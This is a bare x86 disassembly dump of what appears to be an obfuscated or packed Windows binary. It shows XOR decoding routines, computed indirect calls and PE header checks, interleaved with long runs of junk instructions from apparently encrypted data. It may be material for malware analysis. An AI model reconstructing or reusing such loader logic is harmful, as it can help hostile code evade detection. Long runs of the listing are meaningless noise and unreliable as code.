  40a0d9:	call   0x408a84
  40a0de:	test   eax,eax
  40a0e0:	je     0x40a10e
  40a0e6:	lea    eax,[ebp-0x10c]
  40a0ec:	push   eax
  40a0ed:	mov    eax,DWORD PTR [ebp-0x4]
  40a0f0:	xor    eax,esi
  40a0f2:	add    eax,ebx
  40a0f4:	push   eax
  40a0f5:	mov    eax,DWORD PTR [ebp+0x10]
  40a0f8:	add    eax,0xee
  40a0fd:	push   eax
  40a0fe:	mov    eax,DWORD PTR [ebp+0x10]
  40a101:	mov    eax,DWORD PTR [eax+0x198]
  40a107:	push   DWORD PTR [eax]
  40a109:	call   0x40b2c8
  40a10e:	mov    ecx,DWORD PTR [ebp-0x48]
  40a111:	xor    ecx,esi
  40a113:	mov    eax,0xffcd8d63
  40a118:	sub    eax,ecx
  40a11a:	sub    eax,DWORD PTR [ebp-0x24]
  40a11d:	mov    ecx,DWORD PTR [ebp-0x68]
  40a120:	add    ecx,eax
  40a122:	mov    eax,DWORD PTR [ebp-0x24]
  40a125:	mov    DWORD PTR [eax+0x1],ecx
  40a128:	mov    al,BYTE PTR [ebp-0x29]
  40a12b:	mov    ecx,DWORD PTR [ebp-0x24]
  40a12e:	xor    al,0x48
  40a130:	sub    al,0x36
  40a132:	mov    BYTE PTR [ecx],al
  40a134:	lea    eax,[ebp-0x24]
  40a137:	inc    BYTE PTR [eax]
  40a139:	inc    eax
  40a13a:	push   eax
  40a13b:	pop    ecx
  40a13c:	dec    ecx
  40a13d:	xchg   ecx,edx
  40a13f:	dec    BYTE PTR [edx]
  40a141:	push   DWORD PTR [ebp+0x10]
  40a144:	mov    eax,ds:0x412264
  40a149:	mov    eax,DWORD PTR [eax]
  40a14b:	push   DWORD PTR [eax]
  40a14d:	lea    eax,ds:0x412280
  40a153:	push   DWORD PTR [eax]
  40a155:	lea    eax,ds:0x41202c
  40a15b:	push   DWORD PTR [eax]
  40a15d:	lea    eax,ds:0x412260
  40a163:	push   DWORD PTR [eax]
  40a165:	lea    eax,ds:0x41237c
  40a16b:	push   DWORD PTR [eax]
  40a16d:	xchg   ebx,edx
  40a16f:	inc    ebx
  40a170:	inc    ebx
  40a171:	sub    ebx,0x3
  40a174:	push   ebx
  40a175:	pop    eax
  40a176:	call   DWORD PTR [eax+0x1]
  40a179:	mov    DWORD PTR [ebp-0x6c],edi
  40a17c:	mov    eax,DWORD PTR [ebp-0x3c]
  40a17f:	mov    eax,DWORD PTR [ebp-0x18]
  40a182:	push   DWORD PTR [ebp-0x20]
  40a185:	lea    eax,[ebp-0x6c]
  40a188:	push   eax
  40a189:	call   0x406433
  40a18e:	mov    eax,ds:0x4121a8
  40a193:	push   0x4
  40a195:	add    eax,0x1cc
  40a19a:	push   eax
  40a19b:	lea    eax,[ebp-0x3c]
  40a19e:	push   eax
  40a19f:	call   0x4052e7
  40a1a4:	mov    eax,DWORD PTR [ebp-0x3c]
  40a1a7:	mov    eax,DWORD PTR [eax]
  40a1a9:	pop    edi
  40a1aa:	pop    esi
  40a1ab:	pop    ebx
  40a1ac:	leave  
  40a1ad:	ret    0xc
  40a1b0:	push   ebp
  40a1b1:	mov    ebp,esp
  40a1b3:	sub    esp,0x20
  40a1b6:	leave  
  40a1b7:	ret    0x4
  40a1ba:	push   ebp
  40a1bb:	mov    ebp,esp
  40a1bd:	push   ecx
  40a1be:	and    DWORD PTR ds:0x4305d6,edx
  40a1c4:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40a1cb:	mov    eax,DWORD PTR [ebp+0x8]
  40a1ce:	or     DWORD PTR ds:0x42eeb0,0x4305d2
  40a1d8:	mov    al,BYTE PTR [eax]
  40a1da:	adc    DWORD PTR ds:0x42ee90,0x639e
  40a1e4:	add    al,0x36
  40a1e6:	sbb    DWORD PTR ds:0x430522,0x596d
  40a1f0:	xor    al,0x48
  40a1f2:	mov    DWORD PTR ds:0x4305ce,0x7356
  40a1fc:	cmp    al,0xcb
  40a1fe:	mov    DWORD PTR ds:0x430532,0x64e0
  40a208:	jne    0x40a51c
  40a20e:	xor    DWORD PTR ds:0x430536,0x7c62
  40a218:	jmp    0x40a496
  40a21d:	lods   al,BYTE PTR ds:[esi]
  40a21e:	inc    edx
  40a21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a220:	es jge 0x40a21c
  40a223:	lods   eax,DWORD PTR ds:[esi]
  40a224:	inc    esp
  40a225:	pop    ecx
  40a226:	push   cs
  40a227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a228:	mov    ds:0xdbe79fe7,eax
  40a22d:	rcl    esi,cl
  40a22f:	jle    0x40a2af
  40a231:	fbstp  TBYTE PTR [eax+0x7e]
  40a234:	jle    0x40a278
  40a236:	pop    edx
  40a237:	mov    ch,0xcc
  40a239:	mov    edi,0xa44f749f
  40a23e:	(bad)  
  40a23f:	xchg   edx,eax
  40a240:	leave  
  40a241:	xchg   esi,eax
  40a242:	cmp    DWORD PTR [edi+0x1d3234fe],0xffffff8a
  40a249:	shl    ebp,1
  40a24b:	aad    0x8a
  40a24d:	add    al,0xf9
  40a24f:	mov    al,0x33
  40a251:	adc    esi,DWORD PTR [eax+0x33]
  40a254:	into   
  40a255:	mov    esi,DWORD PTR [ebx-0x406d9a20]
  40a25b:	xchg   BYTE PTR fs:[bp+si-0x39],dl
  40a260:	fadd   st(7),st
  40a262:	mov    ecx,0xfdf25f0
  40a267:	adc    eax,0x915236ab
  40a26c:	cli    
  40a26d:	adc    DWORD PTR [ebp-0x75],edi
  40a270:	sub    al,0xfa
  40a272:	imul   edi,DWORD PTR ds:0x568b89b6,0xd97f5402
  40a27c:	sbb    BYTE PTR ds:[eax],dh
  40a27f:	cmp    ebp,ebx
  40a281:	rcl    DWORD PTR [edx-0x21bf52cc],1
  40a287:	into   
  40a288:	or     DWORD PTR [ecx+0x48],esp
  40a28b:	mov    ah,0x39
  40a28d:	dec    ecx
  40a28e:	and    BYTE PTR [esp+eax*1],al
  40a291:	mov    eax,0x790cc6c2
  40a296:	stc    
  40a297:	and    al,bl
  40a299:	jne    0x40a29f
  40a29b:	inc    edi
  40a29c:	(bad)  
  40a29d:	lahf   
  40a29e:	cmp    DWORD PTR [ebx+0x4b549e46],edx
  40a2a4:	test   BYTE PTR [edi-0x4b373fb2],cl
  40a2aa:	repz pop edx
  40a2ac:	ret    
  40a2ad:	add    eax,DWORD PTR [edi]
  40a2af:	add    eax,0x84b372e6
  40a2b4:	inc    ebx
  40a2b5:	inc    ebx
  40a2b6:	adc    eax,DWORD PTR [eax-0x4e]
  40a2b9:	aas    
  40a2ba:	pop    ss
  40a2bb:	jno    0x40a2cc
  40a2bd:	popa   
  40a2be:	push   0x14
  40a2c0:	clc    
  40a2c1:	test   al,0xe2
  40a2c3:	jb     0x40a322
  40a2c5:	mov    cl,0x1c
  40a2c7:	pop    es
  40a2c8:	mov    edx,0x4c1a02e9
  40a2cd:	ror    BYTE PTR [ecx+0x19],1
  40a2d0:	mul    cl
  40a2d2:	mov    eax,ds:0xc7379a3d
  40a2d7:	outs   dx,DWORD PTR ds:[esi]
  40a2d8:	in     eax,0x5e
  40a2da:	pop    ebx
  40a2db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2dc:	pop    eax
  40a2dd:	sub    DWORD PTR [edi-0x504b02e4],ebp
  40a2e3:	sub    DWORD PTR ds:0xfc466c7a,ebp
  40a2e9:	stos   DWORD PTR es:[edi],eax
  40a2ea:	lds    eax,FWORD PTR [eax-0x7125f308]
  40a2f0:	mov    WORD PTR cs:[eax+0x2cfa0dfb],?
  40a2f7:	or     DWORD PTR [esi+0x7478c7e8],ebx
  40a2fd:	dec    ecx
  40a2fe:	sbb    ch,BYTE PTR [ebp-0x15]
  40a301:	sar    BYTE PTR [ecx+0x7c],1
  40a304:	xchg   edx,eax
  40a305:	and    cl,BYTE PTR [ebp+ebx*8+0x23]
  40a309:	rcl    DWORD PTR [edi+0x69e62bb7],cl
  40a30f:	(bad)  
  40a310:	bnd jns 0x40a38b
  40a313:	sbb    esi,DWORD PTR [eax-0x17]
  40a316:	adc    BYTE PTR [ebx-0x71effcfa],ch
  40a31c:	and    eax,0xd98b7e95
  40a321:	add    BYTE PTR [eax],bh
  40a323:	sub    BYTE PTR [ebp+0x2dff73ce],0xc1
  40a32a:	loope  0x40a376
  40a32c:	jp     0x40a2dd
  40a32e:	sub    dl,cl
  40a330:	mov    edi,0xfb17a02c
  40a335:	mov    al,0xc5
  40a337:	push   ds
  40a338:	mov    al,0xb1
  40a33a:	(bad)  [ebp+0x1dff3d22]
  40a340:	mov    ch,0x76
  40a342:	int    0xbd
  40a344:	jmp    0xd731:0xcbef4f68
  40a34b:	cmp    eax,0x123afe
  40a350:	jb     0x40a2f9
  40a352:	fucomp st(0)
  40a354:	mov    bl,0x98
  40a356:	push   ss
  40a357:	lods   al,BYTE PTR ds:[esi]
  40a358:	and    eax,DWORD PTR [ecx]
  40a35a:	dec    edi
  40a35b:	fisub  DWORD PTR [edx-0x7e3f8158]
  40a361:	rcr    DWORD PTR [ecx-0x43dc278a],1
  40a367:	or     dl,BYTE PTR [ebp+ecx*2-0x5c]
  40a36b:	div    BYTE PTR [ebp+0x49]
  40a36e:	push   eax
  40a36f:	aas    
  40a370:	leave  
  40a371:	pop    ebp
  40a372:	mov    ebx,0x9c38144a
  40a378:	leave  
  40a379:	les    esp,FWORD PTR [edx+0x169d97cc]
  40a37f:	lds    edx,FWORD PTR [edi+0x6c902f01]
  40a385:	add    al,0xa0
  40a387:	push   edx
  40a388:	mov    bh,0x3d
  40a38a:	repz out 0xc5,al
  40a38d:	xchg   DWORD PTR [edx+ebx*8+0xf],esp
  40a391:	out    dx,eax
  40a392:	lock loop 0x40a35f
  40a395:	adc    DWORD PTR [eax-0x6a],ebx
  40a398:	dec    ebp
  40a399:	mov    eax,eax
  40a39b:	adc    dh,BYTE PTR [edi+0x31]
  40a39e:	jecxz  0x40a3ef
  40a3a0:	mov    ds:0x86b54b03,eax
  40a3a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3a6:	iret   
  40a3a7:	movlps QWORD PTR [edx-0x6d040e6e],xmm2
  40a3ae:	mov    ecx,0x562cc228
  40a3b3:	or     al,0xb7
  40a3b5:	sub    al,0xdd
  40a3b7:	and    edx,ebp
  40a3b9:	cmp    dl,BYTE PTR [ebp+0x9]
  40a3bc:	(bad)  
  40a3bd:	mov    ds:0x9d01c86b,eax
  40a3c2:	xlat   BYTE PTR ds:[ebx]
  40a3c3:	inc    eax
  40a3c4:	mov    ch,0x84
  40a3c6:	cmp    DWORD PTR [eax-0x4481da80],ecx
  40a3cc:	sub    ebx,ebx
  40a3ce:	and    eax,0x1e6b91ad
  40a3d3:	fild   DWORD PTR [edx-0x44]
  40a3d6:	sti    
  40a3d7:	mov    edi,0x47925ac4
  40a3dc:	xchg   BYTE PTR [ebp+0x35],dl
  40a3df:	mov    dh,0xb
  40a3e1:	enter  0x85cb,0x9c
  40a3e5:	mov    DWORD PTR [esi],0x8302b69e
  40a3eb:	jbe    0x40a405
  40a3ed:	dec    esp
  40a3ee:	pop    ebp
  40a3ef:	test   DWORD PTR [esi+esi*1],ecx
  40a3f2:	pusha  
  40a3f3:	std    
  40a3f4:	sbb    al,0xc4
  40a3f6:	mov    WORD PTR [eax+0x28],?
  40a3f9:	sub    al,0x70
  40a3fb:	and    eax,0xab91c28c
  40a400:	fcmovne st,st(0)
  40a402:	daa    
  40a403:	add    al,BYTE PTR [ebx]
  40a405:	ds add al,0x47
  40a408:	push   es
  40a409:	ja     0x40a481
  40a40b:	ins    BYTE PTR es:[edi],dx
  40a40c:	pop    edi
  40a40d:	add    BYTE PTR ds:[ebp+0x23150f1d],ah
  40a414:	add    bh,BYTE PTR [ebx-0x1b830ecf]
  40a41a:	pop    es
  40a41b:	in     al,0x3f
  40a41d:	out    dx,al
  40a41e:	popa   
  40a41f:	lods   eax,DWORD PTR ds:[esi]
  40a420:	iret   
  40a421:	pop    esi
  40a422:	or     al,0x9
  40a424:	pop    ebp
  40a425:	push   ebp
  40a426:	inc    edi
  40a427:	dec    esp
  40a428:	repnz dec esi
  40a42a:	daa    
  40a42b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a42c:	cmp    DWORD PTR [esi+eiz*8-0x4ab81bd2],esi
  40a433:	push   eax
  40a434:	imul   ecx,DWORD PTR [ebp-0x6eba327e],0xffffff8d
  40a43b:	imul   eax,DWORD PTR [eax-0x3],0x41
  40a43f:	cld    
  40a440:	ins    BYTE PTR es:[edi],dx
  40a441:	lods   eax,DWORD PTR ds:[esi]
  40a442:	call   0x8609c6b3
  40a447:	jge    0x40a3ee
  40a449:	push   edx
  40a44a:	or     cl,BYTE PTR ds:[ecx+0x3f]
  40a44e:	jecxz  0x40a4a1
  40a450:	hlt    
  40a451:	retf   
  40a452:	add    ecx,DWORD PTR [edx+0x7009f68a]
  40a458:	sbb    BYTE PTR [eax-0x4c],dh
  40a45b:	cmp    dl,BYTE PTR [edi+0x22]
  40a45e:	jns    0x40a3fe
  40a460:	iret   
  40a461:	sub    BYTE PTR [edi],ch
  40a463:	push   es
  40a464:	jb     0x40a4ab
  40a466:	cli    
  40a467:	pop    ebp
  40a468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a469:	mov    bh,0x8c
  40a46b:	mov    esp,edi
  40a46d:	sbb    BYTE PTR [edi-0x3911617f],dh
  40a473:	push   0x9abd416c
  40a478:	addr16 pop ds
  40a47a:	int3   
  40a47b:	ficom  DWORD PTR [edi-0x577c7c7d]
  40a481:	mov    ?,esp
  40a483:	clc    
  40a484:	jnp    0x40a45f
  40a486:	and    al,0x72
  40a488:	aam    0xa3
  40a48a:	int3   
  40a48b:	mov    ebx,0x88bea040
  40a490:	ret    
  40a491:	aad    0x5f
  40a493:	je     0x40a48b
  40a495:	xchg   esi,eax
  40a496:	mov    eax,DWORD PTR [ebp+0x8]
  40a499:	mov    DWORD PTR ds:0x4305c2,0x17
  40a4a3:	cmp    DWORD PTR ds:0x4305c2,0x0
  40a4aa:	je     0x40a4d8
  40a4b0:	cmp    DWORD PTR ds:0x4305c2,0x24
  40a4b7:	jne    0x40a4c6
  40a4bd:	push   DWORD PTR [ebp-0x28]
  40a4c0:	call   DWORD PTR ds:0x42eb64
  40a4c6:	mov    ecx,DWORD PTR ds:0x4305c2
  40a4cc:	dec    ecx
  40a4cd:	mov    DWORD PTR ds:0x4305c2,ecx
  40a4d3:	jmp    0x40a4a3
  40a4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  40a4db:	sub    edx,0x356a
  40a4e1:	add    ecx,DWORD PTR [eax+0x3c]
  40a4e4:	and    eax,edx
  40a4e6:	mov    edx,0x7510856
  40a4eb:	mov    DWORD PTR [ebp+0x8],ecx
  40a4ee:	mov    eax,DWORD PTR [ebp-0x4]
  40a4f1:	xor    eax,edx
  40a4f3:	push   esi
  40a4f4:	mov    esi,DWORD PTR [ebp+0x8]
  40a4f7:	mov    ecx,0x32729d
  40a4fc:	add    eax,ecx
  40a4fe:	cmp    DWORD PTR [esi+0x54],eax
  40a501:	pop    esi
  40a502:	je     0x40a510
  40a508:	mov    eax,DWORD PTR [ebp+0x8]
  40a50b:	jmp    0x40a7a7
  40a510:	mov    eax,DWORD PTR [ebp-0x4]
  40a513:	xor    eax,edx
  40a515:	add    eax,ecx
  40a517:	jmp    0x40a7a7
  40a51c:	mov    eax,DWORD PTR [ebp-0x4]
  40a51f:	xor    eax,0x7510856
  40a524:	jmp    0x40a7a2
  40a529:	mov    esi,edi
  40a52b:	pop    ds
  40a52c:	outs   dx,BYTE PTR ds:[esi]
  40a52d:	adc    esp,DWORD PTR [esi+0x5b]
  40a530:	jnp    0x40a586
  40a532:	xor    eax,0x3c2ea360
  40a537:	fcomp  QWORD PTR [edx]
  40a539:	mov    ah,0xe8
  40a53b:	jle    0x40a5bb
  40a53d:	fbstp  TBYTE PTR [eax+0x7e]
  40a540:	jle    0x40a52c
  40a542:	rcr    BYTE PTR [esi+0x34],1
  40a545:	add    esp,DWORD PTR [esi+ebx*1]
  40a548:	dec    edi
  40a549:	js     0x40a560
  40a54b:	fwait
  40a54c:	pop    edi
  40a54d:	rcl    BYTE PTR [edi],1
  40a54f:	xor    al,0x97
  40a551:	push   ecx
  40a552:	movups xmm3,XMMWORD PTR [edi+0x3]
  40a556:	jb     0x40a531
  40a558:	jae    0x40a52d
  40a55a:	mov    esp,0xdbb5b543
  40a55f:	mov    esi,0x2744c3d8
  40a564:	out    0x81,al
  40a566:	(bad)  
  40a567:	dec    eax
  40a568:	daa    
  40a569:	mov    esi,DWORD PTR [eax]
  40a56b:	in     al,dx
  40a56c:	mov    ah,0x59
  40a56e:	or     esp,ecx
  40a570:	push   ss
  40a571:	fnstenv [esi+0x397b2fed]
  40a577:	(bad)  
  40a578:	jp     0x40a55f
  40a57a:	shr    bh,cl
  40a57c:	lds    eax,FWORD PTR [edi]
  40a57e:	sbb    ah,BYTE PTR [esi-0x30]
  40a581:	repz leave 
  40a583:	(bad)  
  40a584:	pusha  
  40a585:	cmc    
  40a586:	fist   DWORD PTR [esi]
  40a588:	ror    edi,cl
  40a58a:	(bad)  
  40a58b:	(bad)  
  40a58c:	leave  
  40a58d:	repnz xchg esp,eax
  40a58f:	ss mov edx,0x64b37e6c
  40a596:	mov    edx,0xa915be97
  40a59b:	ja     0x40a551
  40a59d:	push   ds
  40a59e:	push   0x4cfa1989
  40a5a3:	stc    
  40a5a4:	icebp  
  40a5a5:	and    edx,DWORD PTR [esi-0x63f421cf]
  40a5ab:	div    ecx
  40a5ad:	xchg   edx,eax
  40a5ae:	loope  0x40a587
  40a5b0:	pop    ecx
  40a5b1:	into   
  40a5b2:	iret   
  40a5b3:	repnz dec edi
  40a5b5:	xor    eax,edx
  40a5b7:	push   esi
  40a5b8:	ret    0x3e6b
  40a5bb:	sbb    al,ch
  40a5bd:	(bad)  [eax-0x16]
  40a5c0:	mov    ch,0xe7
  40a5c2:	rol    BYTE PTR [eax-0x6f2f9e7b],1
  40a5c8:	adc    al,0xdc
  40a5ca:	jb     0x40a61a
  40a5cc:	cs dec edi
  40a5ce:	xor    ebp,DWORD PTR [eax+0x12]
  40a5d1:	mov    dh,0xb3
  40a5d3:	call   0xf882:0xd9758ba5
  40a5da:	and    ebx,eax
  40a5dc:	push   edx
  40a5dd:	xchg   DWORD PTR [esi-0x275f2beb],ebx
  40a5e3:	inc    ebx
  40a5e4:	in     al,dx
  40a5e5:	sub    bh,ah
  40a5e7:	dec    edx
  40a5e8:	adc    ch,BYTE PTR [ebx-0x65]
  40a5eb:	fwait
  40a5ec:	mov    ds:0x21a4888b,al
  40a5f1:	out    dx,al
  40a5f2:	mov    edx,0x3e5f20fc
  40a5f7:	ins    BYTE PTR es:[edi],dx
  40a5f8:	mul    DWORD PTR [ecx-0x3f9e9d90]
  40a5fe:	push   ds
  40a5ff:	dec    esp
  40a600:	or     ebp,ecx
  40a602:	test   al,0x4c
  40a604:	jg     0x40a5f7
  40a606:	aaa    
  40a607:	mov    BYTE PTR [edi+edi*4-0xce6b67f],dh
  40a60e:	mov    dl,BYTE PTR [edi+0x6c]
  40a611:	setbe  BYTE PTR [esi]
  40a614:	(bad)  
  40a615:	cdq    
  40a616:	fadd   DWORD PTR [ebx+0x6d0c6972]
  40a61c:	add    dl,BYTE PTR [edx]
  40a61e:	inc    esp
  40a61f:	pusha  
  40a620:	cli    
  40a621:	mov    ds:0x12fe212a,al
  40a626:	test   BYTE PTR [edi+0x6d45c7b7],0xd3
  40a62d:	add    cl,BYTE PTR [ebx+0x3da68aaa]
  40a633:	or     BYTE PTR [esi],bh
  40a635:	and    BYTE PTR [edi-0x39],cl
  40a638:	adc    eax,0xc56b7124
  40a63d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a63e:	mov    al,ds:0xf703b9f9
  40a643:	jge    0x40a633
  40a645:	pop    ebx
  40a646:	nop
  40a647:	std    
  40a648:	mov    bl,0xaf
  40a64a:	add    DWORD PTR [edx-0x18b80a91],edx
  40a650:	and    al,0xef
  40a652:	fidiv  WORD PTR [ebx-0x4c]
  40a655:	pop    ss
  40a656:	mov    ds:0x47631913,eax
  40a65b:	cmp    eax,DWORD PTR [ebp+0x7e]
  40a65e:	push   cs
  40a65f:	or     BYTE PTR [esi],0x4
  40a662:	scas   al,BYTE PTR es:[edi]
  40a663:	mov    dh,BYTE PTR [ebp+0x4d]
  40a666:	test   dl,dh
  40a668:	imul   edi,DWORD PTR [ebx+eax*8],0x9f35f0d7
  40a66f:	lds    eax,FWORD PTR [ebx+0x35]
  40a672:	in     al,dx
  40a673:	pop    ss
  40a674:	fmulp  st(3),st
  40a676:	fstp   DWORD PTR [esi+0x17]
  40a679:	clc    
  40a67a:	mov    eax,0x32927105
  40a67f:	ss jg  0x40a6ed
  40a682:	xchg   edx,eax
  40a683:	test   al,0xd2
  40a685:	fpatan 
  40a687:	aam    0xd7
  40a689:	mov    ds:0x7491c7dc,eax
  40a68e:	je     0x40a6c3
  40a690:	js     0x40a661
  40a692:	mov    ds:0x4bed11de,al
  40a697:	retf   
  40a698:	mov    edx,0x61cd7ec8
  40a69d:	mov    edx,0x1f974e2d
  40a6a2:	inc    ebp
  40a6a3:	inc    esi
  40a6a4:	arpl   WORD PTR [edi+0x56],bx
  40a6a7:	das    
  40a6a8:	ss and al,0xc7
  40a6ab:	cmp    DWORD PTR [ecx+0x374c9833],0x69
  40a6b2:	dec    ebx
  40a6b3:	dec    edx
  40a6b4:	arpl   WORD PTR [edx],dx
  40a6b6:	aam    0x61
  40a6b8:	aaa    
  40a6b9:	cmp    BYTE PTR [esi+0x63],al
  40a6bc:	xchg   ebx,eax
  40a6bd:	sbb    esp,DWORD PTR [ecx-0x5500e88b]
  40a6c3:	stos   DWORD PTR es:[edi],eax
  40a6c4:	data16 cmp BYTE PTR [eax],bl
  40a6c7:	adc    al,0xfd
  40a6c9:	dec    esi
  40a6ca:	cmc    
  40a6cb:	jl     0x40a6fb
  40a6cd:	sbb    ecx,DWORD PTR ds:0x96224069
  40a6d3:	cmp    al,0x87
  40a6d5:	xchg   ecx,eax
  40a6d6:	dec    eax
  40a6d7:	cmc    
  40a6d8:	lds    edx,FWORD PTR [ebp+0x4fbd05ca]
  40a6de:	(bad)  
  40a6df:	jge    0x40a68f
  40a6e1:	ins    BYTE PTR es:[edi],dx
  40a6e2:	jmp    0x40a72d
  40a6e4:	out    dx,eax
  40a6e5:	adc    BYTE PTR [edi-0x1b],bh
  40a6e8:	test   al,0x5f
  40a6ea:	add    DWORD PTR [eax],esi
  40a6ec:	jns    0x40a682
  40a6ee:	dec    ecx
  40a6ef:	mov    edi,0x7a65fbef
  40a6f4:	push   ss
  40a6f5:	std    
  40a6f6:	test   DWORD PTR [eax+0x16ec116],0xcdd47f59
  40a700:	add    esi,esp
  40a702:	sahf   
  40a703:	fild   DWORD PTR [ebp+ebx*4-0x78]
  40a707:	cmp    al,0x95
  40a709:	sub    DWORD PTR [esi],esi
  40a70b:	add    ebx,DWORD PTR [esi]
  40a70d:	rol    DWORD PTR [edx-0x14],0x15
  40a711:	dec    edx
  40a712:	jg     0x40a78f
  40a714:	std    
  40a715:	cmc    
  40a716:	mov    al,ds:0x2d83d24e
  40a71b:	ret    
  40a71c:	in     eax,0x31
  40a71e:	(bad)  
  40a71f:	xchg   esp,eax
  40a720:	das    
  40a721:	cmp    al,0xc2
  40a723:	rol    BYTE PTR [edx+0x1d],0xf0
  40a727:	xchg   esp,eax
  40a728:	(bad)  
  40a729:	jmp    0x1c2dc410
  40a72e:	and    eax,0xbb3f8b3b
  40a733:	xor    eax,DWORD PTR [edi-0x2a741d10]
  40a739:	jle    0x40a729
  40a73b:	dec    esi
  40a73c:	test   BYTE PTR [esi],ch
  40a73e:	test   eax,0x8f676317
  40a743:	clc    
  40a744:	(bad)  
  40a745:	cld    
  40a746:	cdq    
  40a747:	jnp    0x40a6fd
  40a749:	cmp    al,BYTE PTR [eax+0x55a0860d]
  40a74f:	mov    edx,DWORD PTR [ebx+0x5baca086]
  40a755:	push   cs
  40a756:	jl     0x40a757
  40a758:	jb     0x40a7d8
  40a75a:	jae    0x40a76c
  40a75c:	xchg   ebx,eax
  40a75d:	mov    dl,0xaf
  40a75f:	jo     0x40a6e8
  40a761:	xor    DWORD PTR [eax+ecx*4-0x44a579fd],eax
  40a768:	or     bl,BYTE PTR [esi]
  40a76a:	stos   DWORD PTR es:[edi],eax
  40a76b:	out    0xfa,eax
  40a76d:	aad    0x48
  40a76f:	les    eax,FWORD PTR [edx]
  40a771:	call   0x3f6d2236
  40a776:	(bad)  
  40a777:	loop   0x40a775
  40a779:	mov    fs,WORD PTR [eax+0x72327775]
  40a77f:	ins    DWORD PTR es:[edi],dx
  40a780:	pop    ds
  40a781:	cmp    dl,BYTE PTR [edx-0x2ea03353]
  40a787:	sbb    esp,ebp
  40a789:	ins    BYTE PTR es:[edi],dx
  40a78a:	push   0xe6f687d1
  40a78f:	push   0x150e2f21
  40a794:	ss mov ebx,0xc60d9afa
  40a79a:	sub    BYTE PTR [edi],al
  40a79c:	push   edi
  40a79d:	sahf   
  40a79e:	cmp    DWORD PTR [edx+0x7c],ebx
  40a7a1:	enter  0x9d05,0x72
  40a7a5:	xor    al,BYTE PTR [eax]
  40a7a7:	leave  
  40a7a8:	ret    0x4
  40a7ab:	push   ebp
  40a7ac:	mov    ebp,esp
  40a7ae:	push   ecx
  40a7af:	inc    eax
  40a7b0:	push   ecx
  40a7b1:	and    DWORD PTR ds:0x43051e,0x0
  40a7bb:	jmp    0x40a7cb
  40a7c0:	mov    eax,ds:0x43051e
  40a7c5:	inc    eax
  40a7c6:	mov    ds:0x43051e,eax
  40a7cb:	cmp    DWORD PTR ds:0x43051e,0x10
  40a7d2:	jae    0x40a821
  40a7d8:	cmp    DWORD PTR ds:0x43051e,0x9
  40a7df:	jne    0x40a7f1
  40a7e5:	push   DWORD PTR [ebp-0x24]
  40a7e8:	push   DWORD PTR [ebp-0x10]
  40a7eb:	call   DWORD PTR ds:0x42ec50
  40a7f1:	cmp    DWORD PTR ds:0x43051e,0x8
  40a7f8:	jne    0x40a809
  40a7fe:	mov    eax,ds:0x43051e
  40a803:	inc    eax
  40a804:	mov    ds:0x43051e,eax
  40a809:	jmp    0x40a7c0
  40a80e:	mov    ecx,DWORD PTR ds:0x430552
  40a814:	xor    edx,edx
  40a816:	add    edx,DWORD PTR ds:0x430556
  40a81c:	sub    ecx,edx
  40a81e:	xor    ecx,DWORD PTR [ecx+edx*1]
  40a821:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40a828:	sbb    ecx,0x259c
  40a82e:	jmp    0x40aa29
  40a833:	imul   ebp,ecx,0x7a81ca81
  40a839:	jge    0x40a8a8
  40a83b:	dec    esp
  40a83c:	jb     0x40a8a1
  40a83e:	jmp    0x40a8b8
  40a840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a841:	adc    ecx,ebx
  40a843:	adc    eax,0x5c7e7eeb
  40a848:	jg     0x40a8c8
  40a84a:	jle    0x40a898
  40a84c:	adc    BYTE PTR [ecx+0x1],dl
  40a84f:	xchg   BYTE PTR [eax+eax*8-0x6816fb7],cl
  40a856:	jae    0x40a7e7
  40a858:	sar    DWORD PTR [edx-0x32],1
  40a85b:	sub    bh,dl
  40a85d:	jns    0x40a836
  40a85f:	aas    
  40a860:	dec    esi
  40a861:	call   ebp
  40a863:	inc    edi
  40a864:	jbe    0x40a7f2
  40a866:	aas    
  40a867:	jl     0x40a86b
  40a869:	in     al,0xee
  40a86b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a86c:	pushf  
  40a86d:	dec    ebp
  40a86e:	jg     0x40a8c6
  40a870:	data16 jl 0x40a880
  40a873:	ficomp WORD PTR [ecx+0x10]
  40a876:	loopne 0x40a859
  40a878:	ins    BYTE PTR es:[edi],dx
  40a879:	push   eax
  40a87a:	je     0x40a813
  40a87c:	or     al,0x6
  40a87e:	cmp    al,0xa3
  40a880:	loop   0x40a8b1
  40a882:	xor    ch,BYTE PTR [ecx]
  40a884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a885:	mov    bh,0x3a
  40a887:	es retf 0xb2a8
  40a88b:	pop    ss
  40a88c:	sbb    esi,esp
  40a88e:	sbb    esp,esi
  40a890:	les    ecx,FWORD PTR ds:0x731db8ab
  40a896:	xchg   ebp,eax
  40a897:	mov    al,ds:0x78a189c0
  40a89c:	hlt    
  40a89d:	xchg   edx,eax
  40a89e:	test   eax,0xe474f924
  40a8a3:	shl    bh,cl
  40a8a5:	test   BYTE PTR [ecx+esi*2+0x3f1efef9],dl
  40a8ac:	sub    al,0xfe
  40a8ae:	retf   0x4f5d
  40a8b1:	dec    ecx
  40a8b2:	stc    
  40a8b3:	inc    ebx
  40a8b4:	mov    bh,0x24
  40a8b6:	fcomp  st(6)
  40a8b8:	in     eax,dx
  40a8b9:	pushf  
  40a8ba:	dec    esp
  40a8bb:	cmp    bl,BYTE PTR [ebp-0x58]
  40a8be:	jl     0x40a8b5
  40a8c0:	push   cs
  40a8c1:	fwait
  40a8c2:	mov    edi,0x9cdb6a6f
  40a8c7:	sbb    BYTE PTR [eax-0x1728a72b],0x73
  40a8ce:	xchg   BYTE PTR [ebx-0x208cdc2f],bh
  40a8d4:	add    esp,edx
  40a8d6:	mov    bh,BYTE PTR [eax]
  40a8d8:	sahf   
  40a8d9:	adc    BYTE PTR [esi-0x14edd48d],cl
  40a8df:	mov    fs,edx
  40a8e1:	jp     0x40a935
  40a8e3:	and    edx,edi
